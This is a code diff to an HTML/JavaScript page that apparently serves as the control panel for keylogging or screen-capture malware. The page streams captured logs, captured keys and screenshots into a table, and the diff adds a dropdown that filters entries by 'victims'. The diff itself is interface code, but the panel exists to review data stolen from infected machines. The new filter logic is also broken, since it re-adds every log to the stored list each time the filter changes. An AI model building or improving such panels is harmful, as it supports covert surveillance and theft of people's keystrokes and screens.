@@ -15,28 +15,11 @@
   table{width:100%;border-collapse:collapse;margin-top:20px;background:rgba(0,20,40,0.7);border:2px solid #0ff;box-shadow:0 0 40px rgba(0,255,255,0.4)}
   th{background:rgba(0,255,255,0.2);padding:15px;color:#0ff;text-shadow:0 0 15px #0ff}
   td{padding:12px;border-bottom:1px solid rgba(0,255,255,0.3)}
-  
-  /* 🔥 FIXED KEY WRAPPING */
-  .keys{
-    font-family:monospace;
-    background:#001;
-    color:#0f0;
-    padding:8px;
-    border-radius:4px;
-
-    max-width:600px;
-    white-space:pre-wrap;      /* allow multi-line */
-    word-wrap:break-word;      /* break long strings */
-    
-    overflow:auto;             /* scroll if too long */
-    max-height:150px;          /* prevents huge vertical expansion */
-  }
-
+  .keys{font-family:monospace;background:#001;color:#0f0;padding:8px;border-radius:4px;max-width:600px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
   .ss{max-width:220px;max-height:124px;cursor:pointer;border:3px solid #033;border-radius:8px;transition:0.3s}
   .ss:hover{border-color:#0ff;transform:scale(1.08);box-shadow:0 0 30px #0ff}
   .modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.98);justify-content:center;align-items:center;z-index:999}
   .modal img{max-width:95%;max-height:95vh;border:4px solid #0ff;border-radius:12px;box-shadow:0 0 80px #0ff}
-  
   .signature{position:fixed;top:15px;right:20px;font-size:1.4em;color:#0ff;text-shadow:0 0 20px #0ff,0 0 40px #0ff;z-index:999;letter-spacing:3px;animation:glow 2s infinite}
   @keyframes glow{0%,100%{text-shadow:0 0 20px #0ff}50%{text-shadow:0 0 50px #0ff,0 0 80px #0ff}}
 </style></head><body>
@@ -78,8 +61,10 @@ let counter = 1;
 const tbody = document.getElementById("logs");
 const filter = document.getElementById("filter");
 const totalEl = document.getElementById("total");
+const allLogs = [];  // ← ALL LOGS EVER
 const clients = new Set();
 
+// CLEAR ALL LOGS
 document.getElementById("clearBtn").onclick = () => {
   if (confirm("PERMANENTLY DELETE ALL LOGS?")) {
     tbody.innerHTML = "";
@@ -89,12 +74,28 @@ document.getElementById("clearBtn").onclick = () => {
   }
 };
 
+// UPDATE FILTER DROPDOWN
+function updateFilter() {
+  const current = filter.value;
+  filter.innerHTML = '<option value="">ALL VICTIMS</option>';
+  [...clients].sort().forEach(client => {
+    const opt = document.createElement("option");
+    opt.value = client;
+    opt.textContent = client;
+    if (client === current) opt.selected = true;
+    filter.appendChild(opt);
+  });
+}
+
+// ADD LOG + RESPECT FILTER
 function addLog(d) {
   if (!d.Client) return;
+  allLogs.push(d);
   clients.add(d.Client);
+  updateFilter();
 
-  const show = filter.value === "" || filter.value === d.Client;
-  if (!show) return;
+  // Only show if matches filter
+  if (filter.value && filter.value !== d.Client) return;
 
   const row = document.createElement("tr");
   row.innerHTML = `
@@ -109,9 +110,20 @@ function addLog(d) {
   totalEl.textContent = tbody.children.length;
 }
 
+// FILTER CHANGE → REBUILD TABLE
+filter.onchange = () => {
+  tbody.innerHTML = "";
+  counter = 1;
+  const selected = filter.value;
+  allLogs
+    .filter(log => !selected || log.Client === selected)
+    .forEach(log => addLog(log));  // reuse addLog to keep counter
+};
+
+// SSE + history
 let es = new EventSource("/events");
 es.onmessage = e => { if (!e.data || e.data.startsWith(":")) return; try { addLog(JSON.parse(e.data)); } catch{} };
 es.onerror = () => { es.close(); setTimeout(() => es = new EventSource("/events"), 3000); };
-fetch("/history").then(r=>r.json()).then(logs => logs.forEach(addLog));
+fetch("/history").then(r => r.json()).then(logs => { logs.forEach(addLog); });
 </script>
 </body></html>
